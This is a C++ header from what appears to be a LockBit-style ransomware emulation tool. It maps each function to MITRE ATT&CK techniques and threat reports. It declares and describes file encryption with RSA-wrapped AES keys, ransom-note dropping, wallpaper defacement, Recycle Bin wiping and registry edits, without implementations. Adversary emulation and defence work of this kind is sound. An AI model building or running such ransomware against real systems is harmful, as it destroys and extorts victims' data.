#pragma once

#include <filesystem>
#include "config.hpp"
#include "crypto/encryption.hpp"
#include "util/winapihelper.hpp"

#define AES_BLOCKLEN 16
#define AES_KEYLEN 32

using FP_SetFilePointer = decltype(&SetFilePointer);
using FP_MoveFileW = decltype(&MoveFileW);

namespace impact {

/*
 * ClearRecycleBin (defined in src/common/impact/recyclin.cpp):
 *      About:
 *          Empties recycle bin (C:\$Recycle.Bin) using the C++ filesystem std library.
 *      Result:
 *          Empty recycle bin (C:\$Recycle.Bin)
 *      MITRE ATT&CK Techniques:
 *          T1485: Data Destruction
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
bool ClearRecycleBin();

/*
 * DropIconFile (defined in src/common/impact/icon.cpp):
 *      About:
 *          Drops icon resource to the Program Data folder using the specified destination file name.
 *      Result:
 *          Returns true on success, false on failure.
 */
bool DropIconFile(LPCWSTR file_name);

/*
 * DropWallpaperFile (defined in src/common/impact/wallpaper.cpp):
 *      About:
 *          Drops wallpaper image resource to the Program Data folder using the specified file name.
 *      Result:
 *          Returns true on success, false on failure.
 */
bool DropWallpaperFile(LPCWSTR file_name);

/*
 * DropResourceToProgramData (defined in src/common/impact/icon.cpp):
 *      About:
 *          Drops specified resource to the Program Data folder using the specified destination file name.
 *          Will throw exception on non-recoverable error
 */
void DropResourceToProgramData(int resource_id, LPCWSTR dest_file_name);

/*
 * SetEncryptedFileIcon (defined in src/common/impact/icon.cpp):
 *      About:
 *          Drops the file icon resource to disk at %PROGRAMDATA%\<extension>.ico (C:\ProgramData\ on most machines),
 *          and sets the icon for .<extension> files to that image by performing the following registry edits:
 *              - Creates key HKCR\.<extension> and sets its default value to <extension>
 *              - Creates key HKCR\<extension>\DefaultIcon and sets its default value to C:\ProgramData\<extension>.ico
 *          CreateFileW and WriteFile API calls are used to save the icon file to disk.
 *          RegCreateKeyExW RegSetValueExW API calls are used to perform the registry edits.
 *      Result:
 *          - Icon file written to disk at %PROGRAMDATA%\<extension>.ico
 *          - Registry key HKCR\.<extension> created with default value set to <extension>
 *          - Registry key HKCR\<extension>\DefaultIcon created with default value set to C:\ProgramData\<extension>.ico
 *      Returns:
 *          True upon success, false upon failure
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 */
bool SetEncryptedFileIcon(const std::wstring& extension);

/*
 * ChangeWallPaper (defined in src/common/impact/wallpaper.cpp):
 *      About:
 *          Drops the desktop wallpaper resource to disk at %PROGRAMDATA%\<filename> (C:\ProgramData\ on most machines)
 *          and changes the current user's desktop wallpaper by setting the Wallpaper value of the 
 *          HKCU\Control Panel\Desktop registry key to the wallpaper image path at C:\ProgramData\<filename>.
 *          CreateFileW and WriteFile API calls are used to save the wallpaper image to disk.
 *          RegCreateKeyExW RegSetValueExW API calls are used to perform the registry edits.
 *      Result:
 *          - Icon file written to disk at %PROGRAMDATA%\<filename>
 *          - Registry key HKCU\Control Panel\Desktop has its Wallpaper value set to C:\ProgramData\<filename>
 *      Returns:
 *          True upon success, false upon failure
 *      MITRE ATT&CK Techniques:
 *          T1491.001: Defacement: Internal Defacement
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
bool ChangeWallPaper(const std::wstring& file_name);

/*
 * EncryptFileLb (defined in src/common/impact/encryption.cpp):
 *      About:
 *          Encrypts first max_bytes_to_encrypt bytes of file (or entire file if not large enough) 
 *          using 256-bit AES in CTR mode. Appends IV and AES key to the encrypted file.
 *          If specified, the AES key will be encrypted using the provided RSA key prior to being appending to the
 *          encrypted file.
 *          File access, reads, and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *          RSA encryption is performed using the Crypto++ library and leverages OAEP padding and SHA1 hash.
 *      Result:
 *          AES-CTR-encrypted file with the custom extension appended to the file path.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
bool EncryptFileLb(const std::wstring& file_path, unsigned char* key, unsigned char* iv, size_t max_bytes_to_encrypt, const std::vector<unsigned char>& rsa_key, bool encrypt_key=true);

/*
 * EncryptFileAndAppendExtension (defined in src/common/impact/encryption.cpp):
 *      About:
 *          Encrypts first 4KB of file (or entire file if less than 4KB) using 256-bit AES in CTR mode. 
 *          Appends IV and AES key to the encrypted file. 
 *          If specified, the AES key will be encrypted using the provided RSA key prior to being appended to the
 *          encrypted file.
 *          Appends the provided extension to the file path via MoveFileW API call if encryption is successful.
 *          File access, reads, and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *          The random AES key and IV are generated using the BCryptGenRandom API call.
 *          RSA encryption is performed using the Crypto++ library and leverages OAEP padding and SHA1 hash.
 *      Result:
 *          AES-CTR-encrypted file with the custom extension appended to the file path.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 *          https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit
 */
bool EncryptFileAndAppendExtension(const std::wstring& file_path, const std::wstring& extension, const std::vector<unsigned char>& rsa_key, bool encrypt_key=true);

/*
 * DropRansomNote (defined in src/common/impact/encryption.cpp):
 *      About:
 *          Writes the ransom note to the specified destination directory using the custom ransomware file
 *          extension and ransom note contents from the configuration. The ransom note filename will be
 *          of the format <extension>.README.txt.
 *          Ransom note creation is performed using the CreateFileW and WriteFile API calls.
 *      Result:
 *          Ransom note created at the provided directory with filename <extension>.README.txt.
 *      Returns:
 *          True on success, False otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
bool DropRansomNote(Config& cfg, const std::wstring& dest_dir);

/*
 * StoreRsaSessionKeys (defined in src/common/impact/encryption.cpp):
 *      About:
 *          RSA-encrypts the RSA private session key using OAEP padding and SHA1 hashing, and writes the RSA
 *          public session key and encrypted private session key to the registry.
 *          Registry key HKCU\SOFTWARE\BlockBlit is creaed with values "pub" and "entire" that contain 
 *          the DER-encoded RSA public session key and encrypted DER-encoded RSA private session key, respectively.
 *          RSA encryption leverages Crypto++ library.
 *          Registry edits are performed using the RegCreateKeyExW and RegSetValueExW API calls.
 *      Result:
 *          Registry key HKCU\SOFTWARE\BlockBlit created with values "pub" and "entire" containing the DER-encoded
 *          RSA public session key and encrypted DER-encoded RSA private session key, respectively.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *          T1112: Modify Registry
 *      CTI:
 *          https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/
 *          https://blog.lexfo.fr/lockbit-malware.html
 */
void StoreRsaSessionKeys(Config& cfg);

} // namespace